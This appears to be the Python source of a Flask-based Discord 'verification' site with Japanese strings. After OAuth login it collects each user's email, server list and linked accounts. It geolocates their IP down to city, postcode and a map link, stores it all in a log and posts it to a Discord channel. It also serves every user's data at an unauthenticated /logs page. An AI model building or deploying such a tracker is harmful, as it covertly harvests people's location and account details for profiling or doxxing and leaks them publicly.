from flask import Flask, request, render_template
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")


def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr


def get_geo_info(ip):
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
        )
        data = res.json()
        return {
            "ip": data.get("query"),
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明"),
            "city": data.get("city", "不明"),
            "zip": data.get("zip", "不明"),
            "isp": data.get("isp", "不明"),
            "as": data.get("as", "不明"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "proxy": data.get("proxy", False),
            "hosting": data.get("hosting", False)
        }
    except:
        return {
            "ip": ip, "country": "不明", "region": "不明", "city": "不明",
            "zip": "不明", "isp": "不明", "as": "不明",
            "lat": None, "lon": None, "proxy": False, "hosting": False
        }


def save_log(discord_id, structured_data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    structured_data["timestamp"] = now
    logs[discord_id]["history"].append(structured_data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)


def create_embed(structured_data):
    d = structured_data["discord"]
    ip = structured_data["ip_info"]
    ua = structured_data["user_agent"]

    description = (
        f"**[Discord情報]**\n"
        f"名前: {d['username']}#{d['discriminator']}\n"
        f"ID: {d['id']}\n"
        f"メール: {d['email']}\n"
        f"Premium: {d.get('premium_type', 'なし')}\n"
        f"Locale: {d.get('locale', '不明')}\n\n"

        f"**[IP情報]**\n"
        f"IP: {ip['ip']}\n"
        f"Proxy: {ip['proxy']}\n"
        f"Hosting: {ip['hosting']}\n"
        f"国: {ip['country']}\n"
        f"県: {ip['region']}\n"
        f"市区町村: {ip['city']}\n"
        f"郵便番号: {ip['zip']}\n"
        f"ISP: {ip['isp']}\n"
        f"AS: {ip['as']}\n"
        f"地図リンク: https://www.google.com/maps?q={ip['lat']},{ip['lon']}\n\n"

        f"**[User-Agent情報]**\n"
        f"UA: {ua['raw']}\n"
        f"OS: {ua['os']}\n"
        f"ブラウザ: {ua['browser']}\n"
        f"デバイス: {ua['device']}\n"
        f"Bot判定: {ua['is_bot']}"
    )

    return {
        "title": "✅ 新しいアクセスログ",
        "description": description,
        "thumbnail": {"url": d["avatar_url"]}
    }


@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # トークン取得
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }
    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()

    # サーバー参加
    requests.put(
        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
        headers={
            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
            "Content-Type": "application/json"
        },
        json={"access_token": access_token}
    )

    # IPとUser-Agent取得
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    structured_data = {
        "discord": {
            "username": user.get("username"),
            "discriminator": user.get("discriminator"),
            "id": user.get("id"),
            "email": user.get("email"),
            "avatar_url": avatar_url,
            "locale": user.get("locale"),
            "verified": user.get("verified"),
            "mfa_enabled": user.get("mfa_enabled"),
            "premium_type": user.get("premium_type"),
            "flags": user.get("flags"),
            "public_flags": user.get("public_flags"),
            "guilds": guilds,
            "connections": connections
        },
        "ip_info": geo,
        "user_agent": {
            "raw": ua_raw,
            "os": ua.os.family,
            "browser": ua.browser.family,
            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
            "is_bot": ua.is_bot
        }
    }

    save_log(user["id"], structured_data)

    # Embed送信
    try:
        embed_data = create_embed(structured_data)
        bot.loop.create_task(bot.send_log(embed=embed_data))

        if geo["proxy"] or geo["hosting"]:
            bot.loop.create_task(bot.send_log(
                f"⚠️ 不審なアクセス検出: {user['username']}#{user['discriminator']} (ID: {user['id']})\n"
                f"IP: {geo['ip']} / Proxy: {geo['proxy']} / Hosting: {geo['hosting']}"
            ))

        bot.loop.create_task(bot.assign_role(user["id"]))

    except Exception as e:
        print("Embed送信エラー:", e)

    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])


@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)


def run_bot():
    bot.run(DISCORD_BOT_TOKEN)


if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
